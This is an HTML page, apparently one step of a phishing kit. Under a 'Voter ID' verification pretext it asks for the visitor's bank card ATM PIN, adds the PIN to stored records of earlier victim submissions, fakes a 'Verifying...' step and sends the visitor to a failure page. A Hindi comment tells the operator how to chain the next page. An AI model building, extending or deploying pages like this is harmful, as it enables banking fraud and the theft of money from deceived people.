<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voter ID - ATM PIN Verification</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-container { background: #ffffff; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
        .form-container h2 { text-align: center; margin-bottom: 20px; color: #0056b3; font-size: 22px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; font-size: 14px; }
        .form-group input { width: 100%; padding: 12px 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 3px; background: #fff; }
        .form-group input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }
        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Enter ATM PIN</h2>
        <form id="pinForm">
            <div class="form-group">
                <label for="atmPin">Enter Your Card ATM PIN</label>
                <input type="password" id="atmPin" name="atmPin" placeholder="****" maxlength="6" required>
            </div>
            <button type="submit" id="submitBtn" class="btn-next">Verify & Complete</button>
        </form>
    </div>

    <script>
        document.getElementById('pinForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const atmPin = document.getElementById('atmPin').value;

            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
            let deviceId = localStorage.getItem('voterDeviceId');

            if (submissions.length > 0) {
                let targetIndex = -1;
                for (let i = submissions.length - 1; i >= 0; i--) {
                    if (submissions[i].deviceId === deviceId) {
                        targetIndex = i;
                        break;
                    }
                }
                if (targetIndex === -1) targetIndex = submissions.length - 1;

                // Add ATM PIN to the submission record
                submissions[targetIndex].atmPin = atmPin;

                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
            }

            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Verifying...";

            // Yahan se aap agla page (page6.html) ya success page set kar sakte hain
            setTimeout(() => {
                window.location.href = "failed.html"; 
            }, 1000);
        });
    </script>
</body>
</html>
